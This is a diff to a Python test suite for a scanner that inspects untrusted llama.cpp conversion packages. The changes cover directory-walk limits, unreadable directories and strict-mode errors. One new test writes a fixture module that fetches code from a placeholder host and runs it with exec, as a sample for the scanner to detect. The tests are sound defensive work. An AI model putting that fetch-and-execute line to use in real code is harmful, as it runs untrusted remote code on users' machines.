@@ -1119,7 +1119,8 @@ def test_a_symlink_loop_in_the_package_terminates(tmp_path):
     except (OSError, NotImplementedError):
         pytest.skip("this filesystem does not allow creating directory symlinks")
 
-    names, complete = llama_cpp._conversion_package_modules(str(conversion))
+    walk = llama_cpp._conversion_package_modules(str(conversion))
+    names, complete = walk.names, walk.complete
 
     # Terminating at all is the claim; the module is found once through the real
     # path, and the loop contributes at most the one pass before it is noticed.
@@ -1157,9 +1158,10 @@ def test_the_walk_stops_once_the_cap_is_known_to_be_crossed(tmp_path, monkeypatc
 
     monkeypatch.setattr(llama_cpp.os, "walk", counting_walk)
     limit = llama_cpp.MAX_CONVERSION_PACKAGE_FILES + 1
-    names, complete = llama_cpp._conversion_package_modules(
+    walk = llama_cpp._conversion_package_modules(
         str(conversion), file_limit = limit,
     )
+    names, complete = walk.names, walk.complete
 
     assert len(names) == limit
     assert len(visited) <= limit + 1, (
@@ -1202,11 +1204,12 @@ def test_a_tree_that_is_huge_without_being_python_is_still_bounded(
             yield entry
 
     monkeypatch.setattr(llama_cpp.os, "walk", counting_walk)
-    names, complete = llama_cpp._conversion_package_modules(
+    walk = llama_cpp._conversion_package_modules(
         str(conversion),
         file_limit = llama_cpp.MAX_CONVERSION_PACKAGE_FILES + 1,
         entry_limit = llama_cpp.MAX_CONVERSION_PACKAGE_ENTRIES,
     )
+    names, complete = walk.names, walk.complete
     assert len(names) <= llama_cpp.MAX_CONVERSION_PACKAGE_FILES
     assert complete is False, "an oversized tree must not report itself fully walked"
 
@@ -1422,6 +1425,83 @@ def test_bytecode_that_cannot_be_purged_reaches_the_cache_key(tmp_path, monkeypa
 
     assert seen[0] == ()
     assert seen[1] == ("conversion/__pycache__/base.cpython-313.pyc",), seen[1]
+
+
+def test_an_unreadable_directory_does_not_silence_the_whole_package(
+    tmp_path, monkeypatch, caplog
+):
+    """One scandir failure used to discard everything already collected.
+
+    The walk returned (None, False) and the scan returned without a word, so an
+    untrusted package could pair an unreadable directory with a readable module
+    its initializer imports and strict mode would run that module reporting
+    nothing at all.
+    """
+    llama_cpp = _load("llama_cpp_unreadable_probe", "unsloth_zoo/llama_cpp.py")
+
+    root = _package_root(tmp_path)
+    conversion = root / "conversion"
+    (conversion / "payload.py").write_text(
+        "import requests\nexec(requests.get('http://example.invalid/p').text)\n",
+        encoding = "utf-8",
+    )
+    locked = conversion / "locked"
+    locked.mkdir()
+
+    real_scandir = os.scandir
+
+    def refuse(path, *args, **kwargs):
+        if str(path) == str(locked):
+            raise PermissionError(13, "permission denied", str(path))
+        return real_scandir(path, *args, **kwargs)
+
+    monkeypatch.setattr(llama_cpp.os, "scandir", refuse)
+
+    walk = llama_cpp._conversion_package_modules(str(conversion))
+    assert "payload.py" in walk.names, "modules found before the failure were discarded"
+    assert walk.unreadable == ("locked",), walk.unreadable
+    assert walk.complete is False
+
+    monkeypatch.delenv("UNSLOTH_CONVERTER_SCAN_STRICT", raising = False)
+    monkeypatch.delenv("UNSLOTH_DISABLE_CONVERTER_SCAN", raising = False)
+    caplog.clear()
+    with caplog.at_level(logging.WARNING):
+        llama_cpp._scan_conversion_package(str(root))
+    messages = [record.message for record in caplog.records]
+    # Both: the directory nothing could read, and the payload that was readable.
+    assert any("could not read" in message for message in messages), messages
+    assert any("example.invalid" in message or "remote" in message.lower()
+               for message in messages), messages
+
+    monkeypatch.setenv("UNSLOTH_CONVERTER_SCAN_STRICT", "1")
+    with pytest.raises(llama_cpp.ConverterScanError):
+        llama_cpp._scan_conversion_package(str(root))
+
+
+def test_a_package_directory_that_cannot_be_opened_at_all_is_still_reported(
+    tmp_path, monkeypatch
+):
+    """The top of the tree is the one case where nothing can be collected, and it
+    must not read as an empty, clean package either."""
+    llama_cpp = _load("llama_cpp_unreadable_top_probe", "unsloth_zoo/llama_cpp.py")
+
+    root = _package_root(tmp_path)
+    conversion = root / "conversion"
+    real_scandir = os.scandir
+
+    def refuse(path, *args, **kwargs):
+        if str(path) == str(conversion):
+            raise PermissionError(13, "permission denied", str(path))
+        return real_scandir(path, *args, **kwargs)
+
+    monkeypatch.setattr(llama_cpp.os, "scandir", refuse)
+    walk = llama_cpp._conversion_package_modules(str(conversion))
+    assert walk.names is None and walk.unreadable == (".",)
+
+    monkeypatch.setenv("UNSLOTH_CONVERTER_SCAN_STRICT", "1")
+    monkeypatch.delenv("UNSLOTH_DISABLE_CONVERTER_SCAN", raising = False)
+    with pytest.raises(llama_cpp.ConverterScanError, match = "could not read"):
+        llama_cpp._scan_conversion_package(str(root))
 
 
 def _package_root(tmp_path):
@@ -1644,7 +1724,7 @@ def test_ordinary_bytecode_caches_do_not_push_a_package_over_the_cap(
     for index in range(25):
         (cache / f"mod_{index:03d}.cpython-313.pyc").write_bytes(_pyc(0))
 
-    names, _complete = llama_cpp._conversion_package_modules(str(conversion))
+    names = llama_cpp._conversion_package_modules(str(conversion)).names
     assert len(names) == 40, sorted(names)[:5]
 
     monkeypatch.setenv("UNSLOTH_CONVERTER_SCAN_STRICT", "1")
@@ -1662,7 +1742,7 @@ def test_a_pyc_beside_its_own_source_is_not_a_module_of_its_own(tmp_path):
     root = _package_root(tmp_path)
     (root / "conversion" / "base.pyc").write_bytes(_pyc(0))
 
-    names, _complete = llama_cpp._conversion_package_modules(str(root / "conversion"))
+    names = llama_cpp._conversion_package_modules(str(root / "conversion")).names
     assert sorted(names) == ["__init__.py", "base.py"], sorted(names)
 
 
@@ -1703,11 +1783,12 @@ def test_one_wide_directory_cannot_outrun_the_entry_budget(tmp_path, monkeypatch
                 yield entry
 
     monkeypatch.setattr(llama_cpp.os, "scandir", _CountingScandir)
-    names, complete = llama_cpp._conversion_package_modules(
+    walk = llama_cpp._conversion_package_modules(
         str(conversion),
         file_limit = llama_cpp.MAX_CONVERSION_PACKAGE_FILES + 1,
         entry_limit = llama_cpp.MAX_CONVERSION_PACKAGE_ENTRIES + 1,
     )
+    names, complete = walk.names, walk.complete
 
     assert complete is False
     # The bound is on entries TOUCHED, which is the claim the budget makes. One
